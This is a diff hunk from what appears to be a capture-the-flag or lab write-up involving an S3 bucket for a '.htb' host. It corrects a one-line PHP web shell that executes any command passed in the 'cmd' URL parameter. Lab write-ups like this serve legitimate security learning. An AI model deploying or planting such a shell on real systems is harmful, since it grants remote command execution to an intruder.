@@ -57,7 +57,7 @@ Could not connect to the endpoint URL: "https://s3.a.amazonaws.com/thetroppers.h
 ```
 cd Desktop
 sudo nano shell.php
-file: <?php system($ GET['cmd']); ?>
+file: <?php system($_GET['cmd']); ?>
 ```
 
 ```
